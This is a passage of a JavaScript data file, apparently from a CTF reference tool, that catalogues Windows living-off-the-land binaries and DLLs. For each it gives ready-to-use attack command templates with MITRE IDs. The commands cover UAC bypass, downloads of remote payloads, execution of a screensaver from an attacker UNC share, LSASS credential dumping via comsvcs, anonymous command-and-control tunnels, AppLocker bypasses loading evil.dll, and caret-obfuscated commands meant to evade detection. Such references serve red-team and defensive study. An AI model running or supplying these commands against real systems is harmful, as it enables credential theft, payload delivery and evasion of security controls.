`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`, which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.", "usecase": "Execute a payload as a child process of `bash.exe` while masquerading as WSL.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "wsreset": {
    name: "Wsreset.exe",
    description: "Used to reset Windows Store settings according to its manifest file",
    path: ["C:\\Windows\\System32\\wsreset.exe"],
    commands: [{"cmd": "wsreset.exe", "desc": "During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.", "usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "User"}]
  },
  "wt": {
    name: "wt.exe",
    description: "Windows Terminal",
    path: ["C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_<version_packageid>\\wt.exe"],
    commands: [{"cmd": "wt.exe {CMD}", "desc": "Execute a command via Windows Terminal.", "usecase": "Use wt.exe as a proxy binary to evade defensive counter-measures", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "wuauclt": {
    name: "wuauclt.exe",
    description: "Windows Update Client",
    path: ["C:\\Windows\\System32\\wuauclt.exe", "C:\\Windows\\UUS\\amd64\\wuauclt.exe"],
    commands: [{"cmd": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer", "desc": "Loads and executes DLL code on attach.", "usecase": "Execute dll via attach/detach methods", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "xbootmgr": {
    name: "XBootMgr.exe",
    description: "Windows Performance Toolkit binary used to start performance traces.",
    path: ["C:\\Program Files\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgr.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgr.exe"],
    commands: [{"cmd": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -callBack {PATH:.exe}", "desc": "Executes an executable after the trace is complete using the callBack parameter.", "usecase": "Executes code as part of post-trace automation flow.", "category": "Execute", "mitre": "T1202", "privileges": "Administrator"}, {"cmd": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -preTraceCmd {PATH:.exe}", "desc": "Executes an executable before each trace run using the preTraceCmd parameter.", "usecase": "Executes code as part of pre-trace automation or staging.", "category": "Execute", "mitre": "T1202", "privileges": "Administrator"}]
  },
  "xbootmgrsleep": {
    name: "XBootMgrSleep.exe",
    description: "Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.",
    path: ["C:\\Program Files\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgrsleep.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgrsleep.exe"],
    commands: [{"cmd": "xbootmgrsleep.exe 1000 {PATH:.exe}", "desc": "Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution.", "usecase": "Performs execution of specified executable, can be used as a defense evasion", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "xsd": {
    name: "xsd.exe",
    description: "XML Schema Definition Tool included with the Windows Software Development Kit (SDK).",
    path: ["C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\bin\\NETFX <version> Tools\\xsd.exe"],
    commands: [{"cmd": "xsd.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "xwizard": {
    name: "Xwizard.exe",
    description: "Execute custom class that has been added to the registry or download a file with Xwizard.exe",
    path: ["C:\\Windows\\System32\\xwizard.exe", "C:\\Windows\\SysWOW64\\xwizard.exe"],
    commands: [{"cmd": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}", "desc": "Xwizard.exe running a custom class that has been added to the registry.", "usecase": "Run a com object created in registry to evade defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}", "desc": "Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.", "usecase": "Run a com object created in registry to evade defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}", "desc": "Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "advpack": {
    name: "Advpack.dll",
    description: "Utility for installing software and drivers with rundll32.exe",
    path: ["C:\\Windows\\System32\\advpack.dll"],
    commands: [{"cmd": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,", "desc": "Execute code via INF file using rundll32", "usecase": "AWL bypass via signed DLL", "category": "AWL Bypass", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}", "desc": "Execute a custom EXE/DLL via RegisterOCX", "usecase": "Execute arbitrary code", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "desk": {
    name: "Desk.cpl",
    description: "Desktop Settings Control Panel",
    path: ["C:\\Windows\\System32\\desk.cpl"],
    commands: [{"cmd": "rundll32.exe desk.cpl,InstallScreenSaver {PATH:.scr}", "desc": "Execute a screensaver file via desk.cpl", "usecase": "Proxy execution of .scr payload", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe desk.cpl,InstallScreenSaver \\\\ATTACKER\\share\\evil.scr", "desc": "Execute remote screensaver from UNC path", "usecase": "Remote execution via SMB", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "dfshim": {
    name: "Dfshim.dll",
    description: "ClickOnce engine in Windows used by .NET",
    path: ["C:\\Windows\\System32\\dfshim.dll"],
    commands: [{"cmd": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "desc": "Run a ClickOnce application from a remote URL", "usecase": "AWL bypass via trusted ClickOnce engine", "category": "AWL Bypass", "mitre": "T1218.011", "privileges": "User"}]
  },
  "ieadvpack": {
    name: "Ieadvpack.dll",
    description: "INF installer for Internet Explorer, similar functionality to advpack.dll",
    path: ["C:\\Windows\\System32\\ieadvpack.dll"],
    commands: [{"cmd": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,", "desc": "Execute code via INF file", "usecase": "AWL bypass via IE DLL", "category": "AWL Bypass", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}", "desc": "Execute arbitrary EXE via RegisterOCX", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "ieframe": {
    name: "Ieframe.dll",
    description: "Internet Browser DLL for translating HTML code",
    path: ["C:\\Windows\\System32\\ieframe.dll"],
    commands: [{"cmd": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}", "desc": "Open a .url internet shortcut to execute an application", "usecase": "Execute arbitrary code via URL shortcut", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "mshtml": {
    name: "Mshtml.dll",
    description: "Microsoft HTML Viewer",
    path: ["C:\\Windows\\System32\\mshtml.dll"],
    commands: [{"cmd": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}", "desc": "Execute an HTA application via PrintHTML function", "usecase": "Execute HTA payload via trusted DLL", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "pcwutl": {
    name: "Pcwutl.dll",
    description: "Program Compatibility Wizard utility library",
    path: ["C:\\Windows\\System32\\pcwutl.dll"],
    commands: [{"cmd": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}", "desc": "Launch an arbitrary executable via pcwutl.dll", "usecase": "Proxy execution of arbitrary EXE", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "photoviewer": {
    name: "PhotoViewer.dll",
    description: "Windows Photo Viewer",
    path: ["C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll"],
    commands: [{"cmd": "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}", "desc": "Download a file from a remote URL via ImageView_Fullscreen", "usecase": "Download payload from internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "scrobj": {
    name: "Scrobj.dll",
    description: "Windows Script Component Runtime",
    path: ["C:\\Windows\\System32\\scrobj.dll"],
    commands: [{"cmd": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}", "desc": "Download a remote file via GenerateTypeLib", "usecase": "Download payload from internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "setupapi": {
    name: "Setupapi.dll",
    description: "Windows Setup Application Programming Interface",
    path: ["C:\\Windows\\System32\\setupapi.dll"],
    commands: [{"cmd": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "desc": "Execute code via INF section using setupapi", "usecase": "AWL bypass via signed system DLL", "category": "AWL Bypass", "mitre": "T1218.011", "privileges": "User"}]
  },
  "shdocvw": {
    name: "Shdocvw.dll",
    description: "Shell Doc Object and Control Library",
    path: ["C:\\Windows\\System32\\shdocvw.dll"],
    commands: [{"cmd": "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}", "desc": "Open a URL shortcut file to execute an application", "usecase": "Execute arbitrary code via URL shortcut", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "shell32": {
    name: "Shell32.dll",
    description: "Windows Shell Common Dll",
    path: ["C:\\Windows\\System32\\shell32.dll"],
    commands: [{"cmd": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}", "desc": "Execute a DLL via Control Panel", "usecase": "Proxy DLL execution", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}", "desc": "Execute an arbitrary EXE via ShellExec_RunDLL", "usecase": "Proxy execution via trusted DLL", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe shell32.dll,#44 {PATH:.dll}", "desc": "Execute DLL by ordinal #44", "usecase": "Ordinal-based proxy execution", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "shimgvw": {
    name: "Shimgvw.dll",
    description: "Photo Gallery Viewer",
    path: ["C:\\Windows\\System32\\shimgvw.dll"],
    commands: [{"cmd": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}", "desc": "Download a remote file via photo viewer DLL", "usecase": "Download payload from internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "syssetup": {
    name: "Syssetup.dll",
    description: "Windows NT System Setup",
    path: ["C:\\Windows\\System32\\syssetup.dll"],
    commands: [{"cmd": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "desc": "Execute code via INF file using syssetup.dll", "usecase": "AWL bypass via signed setup DLL", "category": "AWL Bypass", "mitre": "T1218.011", "privileges": "User"}]
  },
  "url": {
    name: "Url.dll",
    description: "Internet Shortcut Shell Extension DLL",
    path: ["C:\\Windows\\System32\\url.dll"],
    commands: [{"cmd": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}", "desc": "Execute an HTA file via url.dll OpenURL", "usecase": "Execute HTA payload", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}", "desc": "Execute an EXE via FileProtocolHandler", "usecase": "Proxy execution via trusted DLL", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "desc": "Execute via obfuscated file URL with carets", "usecase": "Bypass simple command-line detection", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "zipfldr": {
    name: "Zipfldr.dll",
    description: "Compressed Folder library",
    path: ["C:\\Windows\\System32\\zipfldr.dll"],
    commands: [{"cmd": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}", "desc": "Execute an arbitrary executable via zipfldr RouteTheCall", "usecase": "Proxy execution via ZIP folder DLL", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "desc": "Execute via obfuscated file URL", "usecase": "Bypass simple command-line detection", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "comsvcs": {
    name: "Comsvcs.dll",
    description: "COM+ Services DLL — commonly abused for LSASS memory dumps",
    path: ["C:\\Windows\\System32\\comsvcs.dll"],
    commands: [{"cmd": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} C:\\Windows\\Temp\\dump.bin full", "desc": "Dump LSASS process memory via MiniDump function (get PID from: Get-Process lsass)", "usecase": "Credential dumping via trusted system DLL", "category": "Dump", "mitre": "T1003.001", "privileges": "SYSTEM"}]
  },
  "devtunnel": {
    name: "devtunnel.exe",
    description: "Binary to enable forwarded ports on Windows (Visual Studio Dev Tunnels)",
    path: ["C:\\Users\\{USER}\\AppData\\Local\\Programs\\devtunnel\\devtunnel.exe"],
    commands: [{"cmd": "devtunnel.exe host -p 8080", "desc": "Forward local port 8080 to internet via Microsoft tunnel", "usecase": "Exfiltration or C2 via trusted Microsoft service", "category": "Tunnel", "mitre": "T1572", "privileges": "User"}, {"cmd": "devtunnel.exe host -p 443 --allow-anonymous", "desc": "Open anonymous tunnel on port 443", "usecase": "Anonymous C2 channel via Microsoft infrastructure", "category": "Tunnel", "mitre": "T1572", "privileges": "User"}]
  },
  "aspnet_compiler": {
    name: "Aspnet_Compiler.exe",
    description: "ASP.NET Compilation Tool — can proxy-execute C# code via Build Provider",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"],
    commands: [{"cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\user\\desktop\\asptest\\ -f C:\\users\\user\\desktop\\asptest\\none -u", "desc": "Compile and execute C# code from a specially crafted folder structure", "usecase": "AWL bypass — execute proxied payload via Microsoft signed binary", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "cl_invocation": {
    name: "CL_Invocation.ps1",
    description: "Aero diagnostics script — can proxy-execute arbitrary commands via SyncInvoke",
    path: ["C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1"],
    commands: [{"cmd": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1; SyncInvoke {CMD}", "desc": "Dot-source the script then call SyncInvoke to execute arbitrary commands", "usecase": "PowerShell AWL bypass via trusted diagnostic script", "category": "AWL Bypass", "mitre": "T1216", "privileges": "User"}]
  },
  "cl_loadassembly": {
    name: "CL_LoadAssembly.ps1",
    description: "PowerShell Diagnostic Script — loads .NET assemblies from arbitrary paths",
    path: ["C:\\Windows\\diagnostics\\system\\Audio\\CL_LoadAssembly.ps1"],
    commands: [{"cmd": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\temp\\evil.dll; [Program]::Main()\"", "desc": "Load an unsigned DLL via trusted diagnostic script then invoke its Main method", "usecase": "Execute unsigned .NET assembly bypassing AppLocker", "category": "AWL Bypass", "mitre": "T1216", "privileges": "User"}]
  },
  "cl_mutexverifiers": {
    name: "CL_Mutexverifiers.ps1",
    description: "Aero diagnostics script — proxy-executes a PowerShell script via runAfterCancelProcess",
    path: ["C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1"],
    commands: [{"cmd": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1; runAfterCancelProcess {PATH:.ps1}", "desc": "Execute an arbitrary PowerShell script via trusted diagnostic module", "usecase": "PowerShell script AWL bypass", "category": "AWL Bypass", "mitre": "T1216", "privileges": "User"}]
  },
  "launch_vsdevshell": {
    name: "Launch-VsDevShell.ps1",
    description: "Locates and imports Visual Studio Developer PowerShell module",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1"],
    commands: [{"cmd": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}", "desc": "Execute arbitrary EXE by passing it as VsWherePath parameter", "usecase": "Proxy execution via trusted VS script", "category": "Execute", "mitre": "T1216", "privileges": "User"}, {"cmd": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\"", "desc": "Path traversal injection via VsInstallationPath parameter", "usecase": "Execute arbitrary code with path traversal", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "manage_bde": {
    name: "Manage-bde.wsf",
    description: "Windows Script for managing BitLocker — comspec can be hijacked",
    path: ["C:\\Windows\\System32\\manage-bde.wsf"],
    commands: [{"cmd": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf", "desc": "Hijack comspec environment variable to execute arbitrary binary", "usecase": "Execute arbitrary EXE via environment variable hijack", "category": "Execute", "mitre": "T1218.005", "privileges": "User"}, {"cmd": "copy c:\\users\\user\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf", "desc": "Plant renamed executable then trigger via manage-bde.wsf", "usecase": "Execute renamed payload via trusted script", "category": "Execute", "mitre": "T1036", "privileges": "User"}]
  },
  "msedge_proxy": {
    name: "msedge_proxy.exe",
    description: "Microsoft Edge Browser proxy — can download files and execute commands",
    path: ["C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe"],
    commands: [{"cmd": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe\" {REMOTEURL:.zip}", "desc": "Download a file from the internet via Edge proxy", "usecase": "Download payload using trusted Microsoft binary", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe\" --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "desc": "Execute command via gpu-launcher argument", "usecase": "Execute arbitrary command via Electron sandbox escape", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}]
  },
  "register_cimprovider": {
    name: "Register-cimprovider.exe",
    description: "Used to register new WMI providers — can load arbitrary DLLs",
    path: ["C:\\Windows\\System32\\Register-cimprovider.exe"],
    commands: [{"cmd": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}", "desc": "Load an arbitrary DLL as a WMI provider", "usecase": "Execute unsigned DLL via trusted WMI registration tool", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "utilityfunctions": {
    name: "UtilityFunctions.ps1",
    description: "PowerShell Diagnostic Script — loads .NET DLLs and executes their code",
    path: ["C:\\Windows\\diagnostics\\system\\networking\\UtilityFunctions.ps1"],
    commands: [{"cmd": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll; [Program.Class]::Main()\"", "desc": "Load an unsigned DLL and execute its Main method via trusted diagnostic script", "usecase": "Execute unsigned .NET assembly bypassing AppLocker", "category": "AWL Bypass", "mitre": "T1216", "privileges": "User"}]
  },
  "vsls_agent": {
    name: "vsls-agent.exe",
    description: "Agent for Visual Studio Live Share — can load arbitrary DLL extensions",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\vsls-agent.exe"],
    commands: [{"cmd": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}", "desc": "Load an arbitrary DLL as a Live Share agent extension", "usecase": "Execute unsigned DLL via trusted Microsoft binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  }
};
console.log("[CTF Bible] LOLBAS chargé :", Object.keys(LOLBAS).length, "binaires");
